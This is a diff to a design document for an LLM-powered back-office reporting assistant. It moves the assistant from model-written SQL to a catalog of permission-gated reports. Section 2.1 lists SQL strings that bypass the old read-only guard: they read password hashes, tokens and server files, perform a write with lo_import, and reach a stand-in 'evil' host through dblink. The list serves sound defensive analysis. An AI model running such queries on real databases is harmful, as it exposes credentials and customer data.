@@ -103,6 +103,57 @@ applied correctly by a 7B local model. It will not.
 promise the answer is right, and an answer we cannot promise is worse than no
 answer — this is a back-office tool whose output people will act on.
 
+### 2.1 And the guard on `feat/ai-chatbot-guardrails` does not hold
+
+The correctness argument settles it on its own, but the security argument is
+worse — and it is worth writing down because that guard is *mine* and I believed
+it was adequate. Every string below was run through the real `isReadOnly` from
+`app/src/lib/ai/sql.ts`. **All fourteen are ALLOWED:**
+
+```
+SELECT * FROM pg_shadow                              -- prefix check only matches "pg_catalog." qualified
+SELECT rolname, rolpassword FROM pg_authid           -- search_path resolves it unqualified
+SELECT * FROM pg_catalog . pg_shadow                 -- whitespace defeats includes("pg_catalog.")
+SELECT pg_read_file('/etc/passwd')                   -- a function; nothing checks functions
+SELECT pg_ls_dir('/var/lib/postgresql/data')
+SELECT lo_import('/etc/passwd')                      -- a WRITE, inside a SELECT
+SELECT pg_sleep(10)                                  -- DoS
+SELECT * FROM dblink('host=evil','SELECT 1') AS t(x int)   -- egress
+SELECT email, "passwordHash" FROM "StaffMember"      -- see below
+SELECT "publicToken" FROM "Ticket"                   -- no-login capability token
+SELECT "portalToken" FROM "Return"                   -- customer portal capability token
+SELECT string_agg(email, ',') FROM "Customer"        -- whole customer list in one cell; defeats the LIMIT cap
+SELECT query_to_xml('SELECT * FROM "User"', true, true, '')
+SELECT query_to_xml('SELECT * FROM "IntegrationCredential"', true, true, '')
+```
+
+Three are individually decisive:
+
+- **`passwordHash` is on `StaffMember`, not `User`** (`app/prisma/schema.prisma:2885`).
+  The deny list blocks `User`; the hashes are one table over. And
+  `app/__tests__/aiSqlGuard.test.ts:70` **asserts `SELECT * FROM "StaffMember"`
+  is allowed** — a committed test that codifies the hole as intended behaviour.
+  That is what a table-shaped deny list does to a column-shaped problem across
+  163 models that grow every release.
+- **`query_to_xml` executes SQL inside a string literal**, and
+  `referencesDeniedTable` strips single-quoted literals *before* checking — a
+  deliberate choice, so a customer named `'Session'` does not break the
+  assistant for the whole shop. **The false-positive mitigation is the bypass**,
+  and it reaches `IntegrationCredential`, the exact table the list was written
+  to protect.
+- **Functions are not tables.** `pg_read_file`, `lo_import`, `dblink` and
+  `pg_sleep` are unchecked by construction, and `lo_import` is a *write* the
+  keyword gate cannot see because "read-only" was defined as "contains no DML
+  keyword". The app connects as `POSTGRES_USER` (`docker-compose.yml:66`), which
+  `postgres:17.9-alpine` creates as a **superuser**, so this is not theoretical.
+  *(Confirm with `SELECT usesuper FROM pg_user WHERE usename = current_user;`
+  before repeating the superuser claim in a security note.)*
+
+Each is individually patchable. **That is not the lesson.** The guard is a
+denylist over an unbounded grammar: every fix is a thing someone thought of, and
+the next bypass is a function nobody enumerated. The catalog design does not
+patch these — it deletes the grammar. See §7 for what happens to that branch.
+
 ---
 
 ## 3. The architecture: the model routes, the code computes
@@ -126,12 +177,12 @@ Every property we need falls out of this:
 | Requirement | How this delivers it |
 |---|---|
 | Never confabulate | The model cannot invent a number; numbers come from code. When no catalog entry matches, the only representable output is `unsupported`, and the UI says "I can't answer that — here's what I can answer." |
-| Correct numbers | Catalog entries call `lib/reports/*`, which already carry rule 33, `SALES_REVENUE_STATUSES`, and every documented exception. The assistant is *by construction* consistent with the reports page. |
+| Correct numbers | Answers reuse the same report logic the UI uses, which already carries rule 33, `SALES_REVENUE_STATUSES`, and every documented exception — via a caller-scoped wrapper, **not** by importing `lib/reports/` directly (§4.2). The assistant is *by construction* consistent with the reports page. |
 | "A specific set of data" | The catalog *is* the specific set. It is a file you can read in one sitting. |
 | Injection-proof | No generated SQL means no SQL to escape from. The `IntegrationCredential` exfiltration class disappears rather than being filtered. |
 | Cheap on metered APIs | The request is a stable catalog + one short question. Cacheable prefix, tiny completion. See §6. |
 | Works on a 7B local model | "Pick an id from a numbered list and fill two fields" is within reach of small models in a way that "write correct PostgreSQL over 150 tables" is not. |
-| Permission-aware | Each catalog entry declares the permission it needs; entries the caller lacks are filtered out **before** the prompt is built, so the model cannot offer what the user may not see. |
+| Permission-aware | Each entry carries the gate its report already has; entries the caller lacks are filtered out **before** the prompt is built, so the model cannot offer what the user may not see — and the gate is re-checked server-side **after** routing, because the model's choice is a hint, never an authorization. Read §4.1: the substrate for this is thinner than it looks. |
 
 ### The tradeoff, stated honestly
 
@@ -169,40 +220,139 @@ export interface CatalogEntry {
   description: string;
   /** Phrasings a user might actually type. Helps small models route. */
   examples: string[];
-  /** Capability required to run it. Checked server-side, never trusted from the model. */
-  permission: string;
   params: CatalogParam[];
-  /** Calls lib/reports/* — never raw SQL. */
+  /** See §4.1 — roles today, because reports.ts has no permissionProcedure. */
+  gate: { roles: readonly string[] } | { permission: string };
+  /** Output names identifiable people — see §4.1. */
+  namesPeople: boolean;
+  /** Calls lib/ai/answers/* (NOT lib/reports/* directly) — see §4.2. */
   run(args: Record<string, unknown>, ctx: AnswerContext): Promise<AnswerTable>;
 }
 ```
 
-**Seed the catalog from the reports that already exist.** These are the entries
-to ship in phase 1, each wrapping a function that is already correct and
-already tested:
+### 4.1 ⚠ The authorization substrate does not exist — read this before writing an entry
 
-| id | wraps | permission |
-|---|---|---|
-| `sales.daily` | `reports/salesDaily.ts` | `reporting.read` |
-| `sales.byPeriod` | `reports/comparativeSales.ts` | `reporting.read` |
-| `sales.bySalesperson` | `reports/salesBySalespersonReport.ts` | `reporting.read` |
-| `sales.topSellers` | `reports/topSellers.ts` | `reporting.read` |
-| `orders.open` | `reports/openOrders.ts` | `reporting.read` |
-| `orders.staleQuotes` | `reports/staleQuotes.ts` | `reporting.read` |
-| `ar.balanceAging` | `reports/balanceAging.ts` | `accounting.read` |
-| `inventory.health` | `reports/inventoryHealth.ts` | `reporting.read` |
-| `customers.dormant` | `reports/dormantCustomers.ts` | `reporting.read` |
-| `margin.gross` | `reports/grossMargin.ts` | `accounting.read` |
+An earlier draft of this document assigned each entry a `permission` such as
+`reporting.read`. **That was wrong, and shipping it would have created a
+privilege escalation.** Three verified facts:
 
-Ten entries answer the large majority of what anyone actually asks a
-back-office assistant, and every one of them is already consistent with the
-page the user would otherwise open.
+1. **Reports are gated by ROLE, not by permission.**
+   `app/src/server/trpc/routers/reports.ts` contains **40** `roleProcedure(...)`
+   / `protectedProcedure` gates and **zero** `permissionProcedure`. The gates are
+   `MANAGER_ADMIN` (13), `REPORT_ROLES` (4), `PIPELINE_ROLES` (4),
+   `SUPER_ADMIN_ONLY` (3), `ADMIN_ONLY` (2), `ADMIN_MARKETING` (2), plus bare
+   `protectedProcedure`.
+2. **There are only two reporting permissions in the entire catalog** —
+   `reporting.read` (`permissionCatalog.ts:308`) and `reporting.export` (`:314`,
+   `sensitive: true`, *"Download report data and customer lists"*).
+3. So mapping every entry to `reporting.read` — which **DESIGNER** and
+   **MARKETING** hold — hands a Designer `grossMargin` (MANAGER_ADMIN),
+   `balanceAging` (ADMIN_ONLY), `customersReport` and `wealthInsights`
+   (ADMIN_MARKETING), and `dormantCustomers` (MANAGER_ADMIN). And
+   `dormantCustomers.ts:91` returns `firstName, lastName, email, phone` per row
+   — precisely the customer list `reporting.export` exists to withhold.
 
-> **Rule for every future entry:** a catalog entry MUST call a `lib/reports/*`
-> or `lib/*` function. It must not contain a `$queryRaw`. If the answer needs a
-> query that does not exist yet, write it in `lib/reports/` with its own test
-> first, then wrap it. This is what keeps the assistant and the reports from
-> drifting into two different truths.
+**The rule that follows:** an entry's gate is *the role set its tRPC procedure
+uses today*, carried over verbatim, until a real report→permission mapping
+exists. Widening a gate is a separate, deliberate PR — never a side effect of
+adding an assistant entry.
+
+```ts
+  /**
+   * The gate this answer already has in the UI, copied from its tRPC procedure.
+   * Roles today because reports.ts has no permissionProcedure; this becomes a
+   * permission when the report→permission mapping lands. Checked server-side
+   * AFTER routing — the model's choice is a hint, never an authorization.
+   */
+  gate: { roles: readonly string[] } | { permission: string };
+  /** Output names identifiable people. Requires reporting.export as a second gate. */
+  namesPeople: boolean;
+```
+
+Building that report→permission mapping is the **single largest unbudgeted item**
+in this plan (~37 rows, landing beside `feat/custom-roles`). Until it exists,
+copy roles. Do not invent permissions.
+
+### 4.2 ⚠ A catalog entry may NOT call `lib/reports/*` directly
+
+The earlier draft said entries "wrap a function that is already correct and
+already tested". The correctness half is true. The **authorization** half is
+not, and the codebase says so in its own comments:
+
+```
+lib/reports/monthlyPerformance.ts:6   "authorization stays in the tRPC procedure (it needs the session)"
+lib/reports/salespersonDetail.ts:7    same
+lib/reports/designerDashboard.ts:6    "caller-vs-requested salesperson authorization stays in the tRPC procedure"
+lib/reports/opportunities.ts:5        "Role-aware wealth visibility is decided by the caller … passed in as canSeeWealth"
+```
+
+`reports.ts:420-435` is the concrete case: non-managers are locked to **their
+own** staff record, resolved from `ctx.userId`, *never from client input* — and
+that logic lives in the **procedure body**, not the lib function. An entry that
+calls `getSalespersonDetail(prisma, { salesperson })` hands any signed-in
+salesperson any colleague's year. That is an escalation the assistant *creates*,
+not one it inherits. Likewise an entry that defaults `canSeeWealth` to `true`
+silently un-gates wealth profiling.
+
+**So:** entries call a **caller-scoped wrapper** that takes `ctx` and reproduces
+the procedure's scoping. New directory `app/src/lib/ai/answers/`, one file per
+entry, each mirroring exactly what its procedure does with the session.
+
+> **Tripwire (write this test first):** a source-text test asserting **no file
+> under `app/src/lib/ai/answers/` imports from `@/lib/reports/`**. Without it,
+> the next contributor writes the one-line wrapper that looks obviously fine and
+> quietly drops the session scoping. This is CLAUDE.md rule 42 applied to reads.
+
+### 4.3 "Never raw SQL" is true one import deep and false two
+
+**10 of 36** modules in `lib/reports/` use `$queryRaw`/`$queryRawUnsafe`, and
+`buyersReport.ts:274` interpolates a parameter straight into the string:
+
+```ts
+${storeId ? `AND ip."storeLocationId" = ${storeId}` : ""}
+```
+
+Safe **today** only because line 235 hand-narrows it
+(`typeof params.storeId === "number" && params.storeId > 0`). There is no shared
+guard and no tripwire. The property being sold is "no raw SQL"; the property
+actually obtained is *"raw SQL written by a human, parameterised by a model"*,
+resting on 36 functions each independently re-narrowing their own inputs,
+forever.
+
+**So:** every entry validates its args with a zod schema **before** the call,
+and args reaching a raw-SQL report are additionally narrowed at the wrapper. Add
+a test that fails when a new `${` interpolation appears inside a `$queryRaw`
+template in `lib/reports/`.
+
+### 4.4 The seed entries
+
+| id | answer wraps | gate (copied from `reports.ts`) | names people |
+|---|---|---|---|
+| `sales.daily` | `salesDaily` | `REPORT_ROLES` | no |
+| `sales.byPeriod` | `comparativeSales` | `REPORT_ROLES` | no |
+| `sales.topSellers` | `topSellers` | `REPORT_ROLES` | no |
+| `orders.open` | `openOrders` | `REPORT_ROLES` | no |
+| `orders.staleQuotes` | `staleQuotes` | `PIPELINE_ROLES` | no |
+| `inventory.health` | `inventoryHealth` | `MANAGER_ADMIN` | no |
+| `margin.gross` | `grossMargin` | `MANAGER_ADMIN` | no |
+| `ar.balanceAging` | `balanceAging` | `ADMIN_ONLY` | no |
+| `sales.bySalesperson` | `salesBySalespersonReport` | `MANAGER_ADMIN` + self-scoping per `reports.ts:420` | staff |
+| `customers.dormant` | `dormantCustomers` | `MANAGER_ADMIN` **+ `reporting.export`** | **yes** |
+
+Confirm each gate against `reports.ts` at implementation time rather than
+trusting this table — it is a snapshot, and the router is the source of truth.
+
+`customers.dormant` carries a second gate deliberately. `reporting.export` is
+marked `sensitive: true` and exists to withhold customer lists; a list of names,
+emails and phone numbers is no less sensitive for arriving as a chat answer
+than as a CSV download. If that feels heavy for phase 1, **cut the entry** —
+that is the cheaper correct answer.
+
+> **Rule for every future entry:** it MUST go through `lib/ai/answers/`, MUST
+> reproduce its procedure's session scoping, MUST validate args with zod, and
+> MUST NOT contain a `$queryRaw`. If an answer needs a query that does not exist
+> yet, write it in `lib/reports/` with its own test first. This is what keeps
+> the assistant and the reports from becoming two different truths.
 
 ---
 
@@ -325,27 +475,86 @@ off after the first invoice.
 
 ---
 
-## 7. What carries over from the guardrails branch
+## 7. What happens to the guardrails branch
 
-Branch `feat/ai-chatbot-guardrails` (already committed and pushed, no PR yet)
-hardened the text-to-SQL path. Under this design most of it becomes belt-and-
-braces rather than the primary control — **keep it anyway**, because it costs
-nothing and it is what makes "no raw SQL" enforceable rather than aspirational:
+An earlier draft of this section said the guard was "belt-and-braces — keep it
+anyway, it costs nothing." **That was wrong on both counts.** §2.1 shows it
+allows staff password hashes, capability tokens, catalog reads, filesystem
+reads, a write (`lo_import`), and `IntegrationCredential` itself via
+`query_to_xml`. A guard that porous does not cost nothing: it costs **false
+confidence**, which is the most expensive kind of security control.
 
-- `lib/ai/tableAccess.ts` — the deny list (`User`, `Session`, `Account`,
-  `VerificationToken`, `PasswordResetToken`, `IntegrationCredential`) plus the
-  `pg_catalog` / `information_schema` prefix block, and the test asserting every
-  denied name is a real model. Retain as a **defence-in-depth check on any
-  future raw query**, and keep `__tests__/aiSqlGuard.test.ts` green.
-- `chat.ts` on `permissionProcedure("reporting.read")` rather than
-  `protectedProcedure` — carry forward, and additionally check each catalog
-  entry's own `permission` at run time.
-- The `LIMIT` wrapper in `runSelect` — keep for any raw path.
+**Delete, with the text-to-SQL path:**
 
-The finding that motivated all of it stays true and is worth keeping in the
-commit history: **`SELECT * FROM "IntegrationCredential"` is a read-only query
-that passes every keyword gate.** Read-only is not the same as harmless. The
-catalog design retires that whole class of problem instead of filtering it.
+- `lib/ai/sql.ts` — `isReadOnly`, `schemaText`, `runSelect`. All of it.
+- `lib/ai/askData.ts`, `providers/ollama.ts`'s `generateSql`.
+- `__tests__/aiSqlGuard.test.ts` — including **line 70**, which asserts
+  `SELECT * FROM "StaffMember"` is allowed. That assertion is the hole in
+  test form; it must not survive into a branch anyone trusts.
+
+**Keep, repurposed:**
+
+- `lib/ai/tableAccess.ts` — **not** as an assistant control (under the catalog
+  there is no table access to deny), but as a **tripwire**: a test asserting no
+  file under `lib/ai/` reaches a denied table or contains `$queryRaw`. It stops
+  being a filter on model output and becomes a filter on *our* code, which is a
+  bounded grammar and therefore a thing a denylist can actually cover.
+- The `SET LOCAL statement_timeout` in `runSelect` — see §7.1. Do not lose it.
+
+**Keep in the commit history, because both findings are true and load-bearing:**
+`SELECT * FROM "IntegrationCredential"` is a read-only query that passes every
+keyword gate — read-only is not the same as harmless. And the deny list that
+answered it was itself bypassable fourteen ways. Both are the argument for this
+design.
+
+**Also fix on that branch, independent of the assistant:**
+`server/trpc/routers/chat.ts` calls `permissionProcedure("reporting.read")` but
+**never** calls `isModuleEnabled`/`requireModule`. Only the *page* gates on the
+`ai` module. So `/api/trpc/chat.ask` is reachable with the module switched off
+— the same UI-gate-is-not-a-control failure `permissionCatalog.ts`'s own header
+describes about `NavPermission` ("an operator who unchecked 'Sales' for DESIGNER
+had revoked nothing"). `clientPortal.ts`, `legacyArchive.ts` and `billing.ts`
+all gate correctly; the AI router is the one that skipped it.
+
+### 7.1 The database cost nobody budgeted
+
+The catalog design **removes** the one database-side control the raw path had:
+`runSelect` opened a transaction and ran `SET LOCAL statement_timeout = '10s'`
+before every model-authored query. Calling "tested code" instead does not make
+that unnecessary — it makes it easier to forget.
+
+Two facts make this urgent:
+
+- `getFactSalesDay(prisma)` (`lib/reports/factSalesDay.ts:33`) takes **no
+  parameters** and aggregates every order ever written. `getSalesDaily(prisma, {})`
+  applies no range when dates are absent.
+- Today the rate limiter is *human friction* — you navigate to a page and pick
+  filters. The assistant deletes that friction, on the same Postgres container
+  that serves the POS on a NAS.
+
+**So:** every `run()` executes inside a transaction with `SET LOCAL
+statement_timeout` and `SET LOCAL lock_timeout` — **3s, not 10** — plus a
+per-deployment concurrency cap of 1–2 in-flight asks. The question to answer
+before phase 1 ships is: *what does the cashier taking a payment see when three
+managers simultaneously ask "how did we do this year?"*
+
+Note also that `lib/rateLimit.ts` **cannot be used here**: it takes
+`NextApiRequest`/`NextApiResponse` and keys on client IP via `X-Real-IP`. This
+is an App Router tRPC mutation with neither object — and in a single-store
+deployment behind one NAT, IP-keying is one bucket for the whole sales floor.
+Per-user and per-deployment counters need a DB-backed counter; a per-process
+budget is not a budget.
+
+### 7.2 The provenance line is weaker than it looks
+
+§8 phase 2 proposes a provenance line ("this came from the Sales Daily report").
+Keep it — but do not mistake it for an accuracy control. `dormantCustomers.ts`
+hard-excludes `d.name NOT IN ('Freight','MRC','Hardware')` **inside its SQL**,
+and that appears in no parameter and no caption. Someone who cannot audit
+`SUM("netPrice")` cannot audit `{tool: "dormantCustomers", minSpend: 2000}`
+either. The provenance line's real job is *navigational* — it tells the user
+which page to open to see the full definition. Say that in the UI copy rather
+than implying the answer has been shown its work.
 
 ---
 
@@ -353,36 +562,86 @@ catalog design retires that whole class of problem instead of filtering it.
 
 Each phase ships independently and is separately reviewable.
 
+**Phase 0a — centralise rule 33 first.** The shared line-item scope helper from
+§9.1. Sequencing it ahead is what lets catalog entries *compose* the rule rather
+than trust that each report remembered it. It has its own exact test
+(every report's numbers unchanged) and its own value with or without this
+feature.
+
+**Phase 0b — the assistant that speaks first (strongly recommended).**
+
+Before building a question box, consider building a **scheduled morning
+digest**: run N fixed answers under a service identity on a cron, one model call
+to phrase the deltas, deliver by email. It sidesteps most of what makes phase 1
+hard:
+
+- **No user-supplied text at all**, so there is no prompt-injection channel to
+  defend.
+- **One model call per deployment per day**, so cost is arithmetic rather than a
+  control to design.
+- **Latency is irrelevant**, so a small local model on a NAS is genuinely fine
+  and a cloud provider is genuinely optional.
+- **No rate limiting needed** — the trigger is a cron, not a person.
+- It reaches **the owner**, who will never remember to open a chat panel, and it
+  puts a number in front of the one person who can spot a wrong one, every
+  morning.
+
+The substrate already exists: `/api/automations/*` Bearer-token cron endpoints
+driven by the host scheduler (`docs/OPERATIONS.md:99-103`), `lib/email/queue.ts`
+drained by an existing cron, `lib/opsAlert.ts` already env-gated to no-op when
+unconfigured, and `getOpportunityTiles` (`lib/reports/opportunities.ts:57`),
+which already computes "what matters".
+
+It is also a far better accuracy programme than a golden question set: a wrong
+number in front of the owner every morning gets reported within a day. Build the
+answers layer (§4.2) for the digest, then phase 1 is a question box on top of a
+proven layer rather than a new surface *and* a new safety story at once.
+
 **Phase 1 — the catalog and the seam (the real work)**
-1. `lib/ai/catalog.ts` — interface + the ten seed entries above.
-2. `lib/ai/types.ts` — replace `generateSql` with `route`/`narrate`.
-3. `lib/ai/answer.ts` — resolve entry → check permission → validate args →
-   run → cap rows → return `AnswerTable`. Replaces `askData.ts`.
+
+1. `lib/ai/catalog.ts` — interface + the seed entries in §4.4.
+2. `lib/ai/answers/` — one caller-scoped wrapper per entry (§4.2), plus the
+   import tripwire test.
+3. `lib/ai/types.ts` — replace `generateSql` with `route`/`narrate`.
+4. `lib/ai/answer.ts` — resolve entry → **re-check gate server-side** → validate
+   args with zod → run inside a timeout-scoped transaction (§7.1) → cap rows →
+   return `AnswerTable`. Replaces `askData.ts`.
 4. `lib/ai/providers/openaiCompatible.ts` + keep `ollama.ts` as a preset.
 5. `server/trpc/routers/chat.ts` — swap to the new call; keep the permission
    procedure.
-6. Tests: every entry resolves; a made-up id is `unsupported`; a caller without
-   `accounting.read` never sees `ar.balanceAging` in the prompt **and** is
-   refused if it is requested anyway.
+6. `providers/anthropic.ts` and `providers/google.ts` ship **in phase 1**, not
+   later. The stated requirement is *"work with the top 3 and local"*; a phase 1
+   that ships only a local runtime has not met it, and deferring the cloud
+   providers hides the awkward parts (keys, caching, structured-output
+   differences) until after the seam has hardened around one implementation.
+   Keys go through `lib/integrationCatalog.ts` + `resolveCredential` — encrypted
+   at rest, same path as Stripe and SMTP — **not** env vars. That means
+   `AppSettings.aiProviderId` + its migration is phase 1 too.
+7. Tests: every entry resolves; a made-up id is `unsupported`; a caller lacking
+   an entry's gate never sees it in the prompt **and** is refused if it is
+   requested anyway; the §4.2 import tripwire; the §4.3 interpolation tripwire.
 
 **Phase 2 — UI**
 `components/ai/ChatPanel.tsx` renders the table, the "I can't answer that"
-state with the catalog listed, and a "this came from the Sales Daily report"
-provenance line under every answer. That provenance line is not decoration —
-it is how a user checks us.
+state with the catalog listed, and the provenance line — worded as navigation,
+per §7.2, not as proof.
 
-**Phase 3 — cloud providers**
-`providers/anthropic.ts`, `providers/google.ts`. Keys via
-`lib/integrationCatalog.ts` + `resolveCredential` (encrypted at rest, same as
-Stripe/SMTP — never an env var in a multi-tenant deployment). Add
-`AppSettings.aiProviderId` + migration. Prompt caching per §6.
-
-**Phase 4 — coverage**
+**Phase 3 — coverage**
 Grow the catalog based on what real users ask. Log every `unsupported` with the
 question text (behind a setting) — that log *is* the backlog, and it is the
 only honest way to decide what to build next.
 
-**Explicitly out of scope for now**
+**Explicitly out of scope — as decisions, not omissions**
+
+- **Writes. The assistant answers; it never acts.** This was inherited from the
+  PoC's framing rather than argued, so state it: the daily pain in a back office
+  is data entry, and "draft this quote / tag this return / receive this PO" is
+  the obviously valuable next thing. It is deliberately not in scope because
+  every guarantee in §3 depends on the output being a *table the user reads*.
+  A write turns a routing mistake from "wrong answer on screen" into "wrong row
+  in the ledger", and it needs its own confirmation, audit and undo story.
+  Revisit as a separate feature with a separate design — not as a phase of this
+  one.
 - Customer-facing chat. Different threat model entirely (unauthenticated,
   hostile input, no permission context). The catalog design is a good
   foundation for it later, but do not conflate the two.
